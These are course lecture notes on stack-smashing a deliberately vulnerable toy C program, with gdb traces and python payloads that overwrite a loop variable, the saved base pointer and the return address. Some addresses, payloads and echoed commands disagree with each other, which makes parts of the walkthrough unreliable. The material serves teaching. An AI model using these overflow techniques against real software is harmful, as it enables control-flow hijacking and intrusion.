# Unit 3: Stack Smashing Exploits
`From Aviv's 485H`
# Smashing the Stack for Fun and Profit

## The setup

For this class we will use the following silly program to hone our
skills at diagramming the stack and exploiting it:

``` c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void bad(){
  printf("You've been naughty!\n");
}

void good(){
  printf("Go Navy!\n");
}

void vuln(int n, char * str){

  int i = 0;  
  char buf[32];


  strcpy(buf,str);

  while( i < n ){
    printf("%d %s\n",i++, buf);
  }

}

int main(int argc, char *argv[]){

  vuln(atoi(argv[1]), argv[2]);

  return 0;

}
```
Compile this program with your gcc32 alias. If you haven't set that up yet: 
```
alias gcc32='gcc -no-pie -m32 -fno-stack-protector -z execstack'
```

Then compile with gcc32 -g to include symbols. 

When not being exploited, the program will simply print the string some
number of times:

``` example
$ ./vulnerable 5 "Go Navy! Beat Army!"
0 Go Navy! Beat Army!
1 Go Navy! Beat Army!
2 Go Navy! Beat Army!
3 Go Navy! Beat Army!
4 Go Navy! Beat Army!
```

The problem, which we will shortly exploit is the use of the `strcpy()`
function which performs no bounds checking on the length of str prior to
copying into buf. We can easily crash the program with a buffer
overflow:

``` example
$ ./vulnerable  5 `python -c 'print("A"*50)'`
Segmentation fault (core dumped)
```

## Inspecting the stack using gdb

To make use of the programming bug, we first better understand the
extent of the bug by inspecting the stack layout. Let's go about doing
this in GDB by checking out the registers for the base and stack
pointer:

``` example
$ gdb -q ./vulnerable 
Reading symbols from ./vulnerable...done.
(gdb) br vuln
Breakpoint 1 at 0x80484db: file vulnerable.c, line 15.
(gdb) run 5 "Go Navy!"
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 5 "Go Navy!"

Breakpoint 1, vuln (n=5, str=0xbffff895 "Go Navy!") at vulnerable.c:15
15   int i = 0;  
(gdb) disass
Dump of assembler code for function vuln:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
   0x080484d8 <+3>: sub    esp,0x48
=> 0x080484db <+6>: mov    DWORD PTR [ebp-0xc],0x0
   0x080484e2 <+13>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484e5 <+16>: mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+20>: lea    eax,[ebp-0x2c]
   0x080484ec <+23>: mov    DWORD PTR [esp],eax
   0x080484ef <+26>: call   0x8048360 <strcpy@plt>
   0x080484f4 <+31>: jmp    0x8048516 <vuln+65>
   0x080484f6 <+33>: mov    eax,DWORD PTR [ebp-0xc]
   0x080484f9 <+36>: lea    edx,[eax+0x1]
   0x080484fc <+39>: mov    DWORD PTR [ebp-0xc],edx
   0x080484ff <+42>: lea    edx,[ebp-0x2c]
   0x08048502 <+45>: mov    DWORD PTR [esp+0x8],edx
   0x08048506 <+49>: mov    DWORD PTR [esp+0x4],eax
   0x0804850a <+53>: mov    DWORD PTR [esp],0x804860e
   0x08048511 <+60>: call   0x8048350 <printf@plt>
   0x08048516 <+65>: mov    eax,DWORD PTR [ebp-0xc]
   0x08048519 <+68>: cmp    eax,DWORD PTR [ebp+0x8]
   0x0804851c <+71>: jl     0x80484f6 <vuln+33>
   0x0804851e <+73>: leave  
   0x0804851f <+74>: ret    
End of assembler dump.
```

Now that we are in the the function `vuln()` we can start to try and
match up memory locations with offsets from the base and stack pointer.

The easiest one to identify is the variable `i` is at `ebp-0xc` because
the instruction at `vuln+6` we initialize to zero. We can quickly verify
this in gdb by running the instruction and checkin the value of `i`.

``` example
(gdb) p i
$1 = -1209742720
(gdb) ni
19   strcpy(buf,str);
(gdb) ds
Dump of assembler code for function vuln:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
   0x080484d8 <+3>: sub    esp,0x48
   0x080484db <+6>: mov    DWORD PTR [ebp-0xc],0x0
=> 0x080484e2 <+13>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484e5 <+16>: mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+20>: lea    eax,[ebp-0x2c]
   0x080484ec <+23>: mov    DWORD PTR [esp],eax
   0x080484ef <+26>: call   0x8048360 <strcpy@plt>
   0x080484f4 <+31>: jmp    0x8048516 <vuln+65>
   0x080484f6 <+33>: mov    eax,DWORD PTR [ebp-0xc]
   0x080484f9 <+36>: lea    edx,[eax+0x1]
   0x080484fc <+39>: mov    DWORD PTR [ebp-0xc],edx
   0x080484ff <+42>: lea    edx,[ebp-0x2c]
   0x08048502 <+45>: mov    DWORD PTR [esp+0x8],edx
   0x08048506 <+49>: mov    DWORD PTR [esp+0x4],eax
   0x0804850a <+53>: mov    DWORD PTR [esp],0x804860e
   0x08048511 <+60>: call   0x8048350 <printf@plt>
   0x08048516 <+65>: mov    eax,DWORD PTR [ebp-0xc]
   0x08048519 <+68>: cmp    eax,DWORD PTR [ebp+0x8]
   0x0804851c <+71>: jl     0x80484f6 <vuln+33>
   0x0804851e <+73>: leave  
   0x0804851f <+74>: ret    
End of assembler dump.
(gdb) p i
$2 = 0
```

The next instructions prior to the call to `strcpy()` will reveal the
location of `buf` and `str`. We know that the order of arguments to
strcpy is first destination then source, so whichever memory address is
loaded at the stack pointer `esp` must be `buf` (the destination) and
whatever is loaded at `+4` from the stack pointer must be the string
str. Looking closely, that the address `ebp-0x2c` is eventually written
to `esp`, thus must be `buf` and `ebp+0xc` is written to `esp+0x4` and
must be `str`. We can further verify this with gdb by examining the
memory:

``` example
(gdb) x/wx $ebp+0xc 
0xbffff674: 0xbffff895
(gdb) x/s 0xbffff895
0xbffff895: "Go Navy!"
```

If we continue after the call, we'll see that now the same string has
been written to the address starting with `ebp-0x2c`:

``` example
(gdb) ni 5
21   while( i < n ){
(gdb) ds
Dump of assembler code for function vuln:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
   0x080484d8 <+3>: sub    esp,0x48
   0x080484db <+6>: mov    DWORD PTR [ebp-0xc],0x0
   0x080484e2 <+13>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484e5 <+16>: mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+20>: lea    eax,[ebp-0x2c]
   0x080484ec <+23>: mov    DWORD PTR [esp],eax
   0x080484ef <+26>: call   0x8048360 <strcpy@plt>
=> 0x080484f4 <+31>: jmp    0x8048516 <vuln+65>
   0x080484f6 <+33>: mov    eax,DWORD PTR [ebp-0xc]
   0x080484f9 <+36>: lea    edx,[eax+0x1]
   0x080484fc <+39>: mov    DWORD PTR [ebp-0xc],edx
   0x080484ff <+42>: lea    edx,[ebp-0x2c]
   0x08048502 <+45>: mov    DWORD PTR [esp+0x8],edx
   0x08048506 <+49>: mov    DWORD PTR [esp+0x4],eax
   0x0804850a <+53>: mov    DWORD PTR [esp],0x804860e
   0x08048511 <+60>: call   0x8048350 <printf@plt>
   0x08048516 <+65>: mov    eax,DWORD PTR [ebp-0xc]
   0x08048519 <+68>: cmp    eax,DWORD PTR [ebp+0x8]
   0x0804851c <+71>: jl     0x80484f6 <vuln+33>
   0x0804851e <+73>: leave  
   0x0804851f <+74>: ret    
End of assembler dump.
(gdb) x/x $ebp-0x2c 
0xbffff63c: 0x47
(gdb) x/s $ebp-0x2c 
0xbffff63c: "Go Navy!"
```

We now know the location of all the variables, and so we pretty much
have everything we need to diagram the entire stack layout. All that's
left is to just print out the base and stack pointer:

``` example
(gdb) i r esp ebp
esp            0xbffff620 0xbffff620
ebp            0xbffff668 0xbffff668
```

With a little more work, we get a diagram like:

[![](imgs/stack_diagram_vuln.png)](imgs/stack_diagram_vuln.png)

## Overwriting Stack Variables

The first part of smashing the stack will be to change the control flow
of the program with respect to stack variables. Our first target is the
variable i which controls the while loop. The goal is to make it so the
loop loops less.

First lets setup the input in such a way so that we fill up the whole
buffer right up to the 32 byte boundary:

``` example
(gdb) delete
Delete all breakpoints? (y or n) y
(gdb) run 5 `python -c "print 'A'*32"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 5 `python -c "print('A'*32)"`
0 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
3 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Note that in gdb we can use backticks (\`) like in the shell to do
computations. I am using python to generate 32 A's. You can see this by
running the same python command in the terminal:

``` example
user@si485H-base:2.3$ `python -c "print('A'*32)"`
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

The `-c` says to execute the single following line as a python command.

Anyway, back to the gbd terminal, if we fill the buffer with 32 bytes,
things are ok, and the behavior is normal. Let's see what happens if we
write 33 A's.

``` example
(gdb) run 5 `python -c "print('A'*33)"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 5 `python -c "print('A'*33)"`
[Inferior 1 (process 5918) exited normally]
```

Nothing happens! We get no prints. That's because we now wrote the ASCII
value of 'A' to i, which is 65 and greater than 5. But we can change the
command line argument and you'll start to see something happen:

``` example
(gdb) run 66 `python -c "print('A'*33)"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*33"`
65 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
[Inferior 1 (process 5927) exited normally]
```

Now we're getting somewhere. The variable i is equal to 65 and we should
print the string 66 times, but we only do so once. We also see that
we've somehow gained a 'B' to the output? That's because 65+1 is 66 and
in ASCII 66 is B.

We can continue this little experiment further ... keep smashing that
stack.

``` example
gdb) run 66 `python -c "print('A'*34)"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*34"`
[Inferior 1 (process 5937) exited normally]
(gdb) run 66 `python -c "print 'A'*34"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*34"`
[Inferior 1 (process 5940) exited normally]
(gdb) run 66 `python -c "print 'A'*35"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*35"`
[Inferior 1 (process 5943) exited normally]
(gdb) run 66 `python -c "print 'A'*36"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*36"`
[Inferior 1 (process 5946) exited normally]
(gdb) run 66 `python -c "print 'A'*37"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*37"`
[Inferior 1 (process 5949) exited normally]
(gdb) run 66 `python -c "print 'A'*38"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*38"`
[Inferior 1 (process 5952) exited normally]
(gdb) run 66 `python -c "print 'A'*39"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*39"`
[Inferior 1 (process 5955) exited normally]
(gdb) run 66 `python -c "print 'A'*40"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*40"`
[Inferior 1 (process 5958) exited normally]
(gdb) run 66 `python -c "print 'A'*41"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*41"`
[Inferior 1 (process 5961) exited normally]
(gdb) run 66 `python -c "print 'A'*42"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*42"`
[Inferior 1 (process 5964) exited normally]
(gdb) run 66 `python -c "print 'A'*43"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*43"`
[Inferior 1 (process 5967) exited normally]
(gdb) run 66 `python -c "print 'A'*44"`
Starting program: /home/user/git/si485-binary-exploits/lab/01/vulnerable 66 `python -c "print 'A'*44"`

Program received signal SIGSEGV, Segmentation fault.
0xbffff89d in ?? ()
(gdb) 
```

At 44 A's, the program segfaults. What happens here? We've now reached
some important values, namely the saved base pointer. Referring back to
the diagram, the buffer starts at `ebp-0x2c`, which is 44 bytes down the
stack. After writing the 44'th byte, we've now messed with the saved
base pointer, and the stacks can no longer be realigned and thus we
cannot reset the stack frame on return. We can also see how we've
altered the base pointer using GDB:

``` example
(gdb) run 66 `python -c "print('A'*44)"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/git/si485-binary-exploits/lec/1.2/vulnerable 66 `python -c "print 'A'*44"`

Breakpoint 5, main (argc=3, argv=0xbffff704) at vulnerable.c:29
29   vuln(atoi(argv[1]), argv[2]);
(gdb) x/x $ebp
0xbffff668: 0x00000000
(gdb) c
Continuing.

Breakpoint 1, vuln (n=66, str=0xbffff871 'A' <repeats 44 times>) at vulnerable.c:15
15   int i = 0;  
(gdb) c
Continuing.

Breakpoint 3, main (argc=10, argv=0x0) at vulnerable.c:31
31   return 0;
(gdb) x/x $ebp
0xbffff600: 0xbffff61c
(gdb) x/x 0xbffff61c
0xbffff61c: 0x41414141
(gdb) 
```

Before we call `vuln()` the base pointer in main references the 0x00
address, namely to deallocate the whole stack upon leave. Further notice
the address of the base pointer ends in 0xbffff6f68. After we continue
through `vuln()` and return, if we examine the base pointer again, the
address of the base pointer is 0xbffff600. How did this happen exactly?

Well we wrote 44 bytes of 'A', but a string is null terminated by 0x00
(the 45th byte) and that 0x00 overflows the array and overwrote the 68
in the saved base pointer. Now, when the base pointer is restored and
main tries to return, the new base pointer is set to something
nonsensical, and in fact references are long string of A's. The program
crashes as a result.

We're just getting started here --- what if we kept going and overwrote
the control flow? What if we overwrote the return address?

## Overwriting the Return Address

If we return to our diagram of the memory layout, our goal now is to
overwrite the return address of the vuln() function. The return address
is stored at ebp+0x4. So far, we know that we reach the base pointer
after 44 bytes, then the next 4 bytes would overwrite that, and the
following 4 bytes would be the return address. We can verify that in
gdb. Remember, when we use 48 A's, there is actually one extra byte for
the null terminator:

``` example
(gdb) run 66 `python -c "print 'A'*48"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/git/si485-binary-exploits/lec/1.2/vulnerable 66 `python -c "print 'A'*48"`

Breakpoint 1, vuln (n=66, str=0xbffff86d 'A' <repeats 48 times>) at vulnerable.c:15
15   int i = 0;  
(gdb) ds
Dump of assembler code for function vuln:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
   0x080484d8 <+3>: sub    esp,0x48
=> 0x080484db <+6>: mov    DWORD PTR [ebp-0xc],0x0
   0x080484e2 <+13>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484e5 <+16>: mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+20>: lea    eax,[ebp-0x2c]
   0x080484ec <+23>: mov    DWORD PTR [esp],eax
   0x080484ef <+26>: call   0x8048360 <strcpy@plt>
   0x080484f4 <+31>: jmp    0x8048516 <vuln+65>
   0x080484f6 <+33>: mov    eax,DWORD PTR [ebp-0xc]
   0x080484f9 <+36>: lea    edx,[eax+0x1]
   0x080484fc <+39>: mov    DWORD PTR [ebp-0xc],edx
   0x080484ff <+42>: lea    edx,[ebp-0x2c]
   0x08048502 <+45>: mov    DWORD PTR [esp+0x8],edx
   0x08048506 <+49>: mov    DWORD PTR [esp+0x4],eax
   0x0804850a <+53>: mov    DWORD PTR [esp],0x804860e
   0x08048511 <+60>: call   0x8048350 <printf@plt>
   0x08048516 <+65>: mov    eax,DWORD PTR [ebp-0xc]
   0x08048519 <+68>: cmp    eax,DWORD PTR [ebp+0x8]
   0x0804851c <+71>: jl     0x80484f6 <vuln+33>
   0x0804851e <+73>: leave  
   0x0804851f <+74>: ret    
End of assembler dump.
(gdb) c
Continuing.

Breakpoint 7, vuln (n=66, str=0xbffff86d 'A' <repeats 48 times>) at vulnerable.c:21
21   while( i < n ){
(gdb) ds
Dump of assembler code for function vuln:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
   0x080484d8 <+3>: sub    esp,0x48
   0x080484db <+6>: mov    DWORD PTR [ebp-0xc],0x0
   0x080484e2 <+13>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484e5 <+16>: mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+20>: lea    eax,[ebp-0x2c]
   0x080484ec <+23>: mov    DWORD PTR [esp],eax
   0x080484ef <+26>: call   0x8048360 <strcpy@plt>
=> 0x080484f4 <+31>: jmp    0x8048516 <vuln+65>
   0x080484f6 <+33>: mov    eax,DWORD PTR [ebp-0xc]
   0x080484f9 <+36>: lea    edx,[eax+0x1]
   0x080484fc <+39>: mov    DWORD PTR [ebp-0xc],edx
   0x080484ff <+42>: lea    edx,[ebp-0x2c]
   0x08048502 <+45>: mov    DWORD PTR [esp+0x8],edx
   0x08048506 <+49>: mov    DWORD PTR [esp+0x4],eax
   0x0804850a <+53>: mov    DWORD PTR [esp],0x804860e
   0x08048511 <+60>: call   0x8048350 <printf@plt>
   0x08048516 <+65>: mov    eax,DWORD PTR [ebp-0xc]
   0x08048519 <+68>: cmp    eax,DWORD PTR [ebp+0x8]
   0x0804851c <+71>: jl     0x80484f6 <vuln+33>
   0x0804851e <+73>: leave  
   0x0804851f <+74>: ret    
End of assembler dump.
(gdb) x/x $ebp
0xbffff648: 0x41414141
(gdb) x/x $ebp+0x4
0xbffff64c: 0x08048500
(gdb) x/x 0x08048500
0x8048500 <vuln+43>: 0x5489d455
(gdb) x/i 0x08048500
   0x8048500 <vuln+43>: push   ebp
(gdb) x/i 0x08048502
   0x8048502 <vuln+45>: mov    DWORD PTR [esp+0x8],edx
(gdb) c
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xb7e6320f in _IO_vfprintf_internal (s=0xb7fc6ac0 <_IO_2_1_stdout_>, format=<optimized out>, format@entry=0x804860e "%d %s\n", ap=0xbffff654 "m\370\377\277k\205\004\b", ap@entry=0xbffff64c "")
    at vfprintf.c:1661
1661 vfprintf.c: No such file or directory.
```

Following this execution, we see that after the strcpy(), we've
overwritten the lower byte of the return address with 0x00. What's
humorous about this is that this is a valid instruction point, in fact,
it's a valid instruction in the vuln() function at vuln+43. After
executing that instruction, the program will continue and eventually
call printf() again, which will not have valid values for its arguments,
which is what actually crashes the program.

As you are beginning to notice, the takeaway is that the computer is
dumb .... it will just execute whatever is next regardless of any
context. Let's take advantage of that and write something more useful.
In particular, let's get the program to run the function good() about
return. The first thing we need to know in order to do that is the
memory address of the instructions for good(). We can use gdb for that:

``` example
gef➤  disass good
Dump of assembler code for function good:
   0x080484e1 <+0>:	push   ebp
   0x080484e2 <+1>:	mov    ebp,esp
   0x080484e4 <+3>:	push   ebx
   0x080484e5 <+4>:	sub    esp,0x4
   
End of assembler dump.
```

The address of the start of the function is 0x080484e1 so we need to
write those bytes to the return address.

## Brief Timeout!!!! Python Version Differences

Many tutorials, including this one by Aviv and the original Nightmare material were written for Python2. The world has moved on and Python3 is now the default and correct version to be running. For most of the world this was not a problem, but in the exploit world, this transition has been rough. 

Here's an example of how things used to work in Python2: 
 `python -c "print('A'*48+b'\xe1\x84\x04\x08')"`

Here's how it needs to be done in Python3:
 `python -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\xe1\x84\x04\x08')"`

Basically, Python decided to change the way they handled byte strings and printing, and made it a lot more complicated. This has made a lot of people very angry and been widely regarded as a bad move.All things considered, this change basically only impacted people writing exploits so we will just have to live with it. 

For the rest of this course, use the sys.stdout.bufffer.write format to avoid difficulty. I will work to modify the course material but will get to making all the changes eventually.

``` example
(gdb) run 66 `python -c "import sys; sys.stdout.buffer.write(b'A'*48+'\x08\x04\x84\xc1')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/git/si485-binary-exploits/lec/1.2/vulnerable 66 `python -c "print 'A'*48+'\x080484c1'"`

Program received signal SIGSEGV, Segmentation fault.
0x38343008 in ?? ()
```

That didn't work, but we did crash the program. Let's see if we can
figure out what happened:

``` example
(gdb) run 66 `python -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\x43\x62\x4b\x5f')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/git/si485-binary-exploits/lec/1.2/vulnerable 66 `python -c "print 'A'*48+'\x08\x04\x84\xc1'"`

Breakpoint 8, vuln (n=0, str=0xbffff869 'A' <repeats 48 times>, "\b\004\204\301") at vulnerable.c:21
21   while( i < n ){
(gdb) ds
Dump of assembler code for function vuln:
   0x080484d5 <+0>: push   ebp
   0x080484d6 <+1>: mov    ebp,esp
   0x080484d8 <+3>: sub    esp,0x48
   0x080484db <+6>: mov    DWORD PTR [ebp-0xc],0x0
   0x080484e2 <+13>: mov    eax,DWORD PTR [ebp+0xc]
   0x080484e5 <+16>: mov    DWORD PTR [esp+0x4],eax
   0x080484e9 <+20>: lea    eax,[ebp-0x2c]
   0x080484ec <+23>: mov    DWORD PTR [esp],eax
   0x080484ef <+26>: call   0x8048360 <strcpy@plt>
=> 0x080484f4 <+31>: jmp    0x8048516 <vuln+65>
   0x080484f6 <+33>: mov    eax,DWORD PTR [ebp-0xc]
   0x080484f9 <+36>: lea    edx,[eax+0x1]
   0x080484fc <+39>: mov    DWORD PTR [ebp-0xc],edx
   0x080484ff <+42>: lea    edx,[ebp-0x2c]
   0x08048502 <+45>: mov    DWORD PTR [esp+0x8],edx
   0x08048506 <+49>: mov    DWORD PTR [esp+0x4],eax
   0x0804850a <+53>: mov    DWORD PTR [esp],0x804860e
   0x08048511 <+60>: call   0x8048350 <printf@plt>
   0x08048516 <+65>: mov    eax,DWORD PTR [ebp-0xc]
   0x08048519 <+68>: cmp    eax,DWORD PTR [ebp+0x8]
   0x0804851c <+71>: jl     0x80484f6 <vuln+33>
   0x0804851e <+73>: leave  
   0x0804851f <+74>: ret    
End of assembler dump.
(gdb) x/x $ebp+0x4
0xbffff63c: 0xc1840408
```

Interesting. All the bytes are there, but they are in reverse! We forgot
that x86 machines use Little Endian, which means that the most
significant byte is in the right most position. Let's reverse the bytes:

``` example
(gdb) run 66 `python -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\xc1\x84\x04\x08')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user/git/si485-binary-exploits/lec/1.2/vulnerable 66 `python -c "print 'A'*48+'\xc1\x84\x04\x08'"`

Breakpoint 8, vuln (n=0, str=0xbffff869 'A' <repeats 48 times>, "\301\204\004\b") at vulnerable.c:21
21   while( i < n ){
(gdb) c
Continuing.
Go Navy!

Program received signal SIGSEGV, Segmentation fault.
0x00000000 in ?? ()
```

Woohoo! It worked. We got "Go Navy!" to print. But, our program still
had a segmentation fault. Why?

This happened because we were able to change the return address for the
vuln() program which returned control to good() instead of to main(),
but this is not a call instruction. It is more like a jmp instruction.
The difference being that call does more than jmp, in particular, it
will push the return address onto the stack prior to the jmp so that
control can be properly returned. We can do that too, we just need to
write one more address on the stack to where we want good() to return
to. Because we're being bad, why not have it call bad()?

``` example
gef➤  disass bad
Dump of assembler code for function bad:
   0x080484b6 <+0>:	push   ebp
   0x080484b7 <+1>:	mov    ebp,esp
   0x080484b9 <+3>:	push   ebx
   0x080484ba <+4>:	sub    esp,0x4
   0x080484bd <+7>:	call   0x80485c2 <__x86.get_pc_thunk.ax>
   
End of assembler dump.
gef➤  run 66 `python -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\xe1\x84\x04\x08'+b'\xb6\x84\x04\x08')"`
Starting program: /home/devey/Documents/github/nightmare/a.out 66 `python -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\xe1\x84\x04\x08'+b'\xb6\x84\x04\x08')"`
Go Navy!
You've been naughty!

Program received signal SIGSEGV, Segmentation fault.


Program received signal SIGSEGV, Segmentation fault.
0xbffff800 in ?? ()
```

And finally, we can go a bit nuts and have multiple calls to good() and
bad():

``` example
(gdb) run 66 `python -c "import sys; sys.stdout.buffer.write(b'A'*48+b'\xe1\x84\x04\x08'+b'\xb6\x84\x04\x08'+b'\xe1\x84\x04\x08'+b'\xb6\x84\x04\x08')"`
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /home/user/git/si485-binary-exploits/lec/1.2/vulnerable 66 `python -c "print 'A'*48+'\xc1\x84\x04\x08'+'\xad\x84\x04\x08'+'\xc1\x84\x04\x08'+'\xad\x84\x04\x08'+'\x56\x85\x04\x08'"`

Breakpoint 8, vuln (n=134513837, str=0x80484c1 <good> "U\211\345\203\354\030\307\004$\005\206\004\b\350\235\376\377\377\311\303U\211\345\203\354H\307", <incomplete sequence \364>)
    at vulnerable.c:21
21   while( i < n ){
(gdb) c
Continuing.
Go Navy!
You've been naughty!
Go Navy!
You've been naughty!

Program received signal SIGSEGV, Segmentation fault.
0x08048556 in main (argc=<error reading variable: Cannot access memory at address 0x41414149>, argv=<error reading variable: Cannot access memory at address 0x4141414d>) at vulnerable.c:33
33 }
```

At this point, you should feel like the master of your computer. It's
good to give a good hardy laugh: "Bwahaha!"
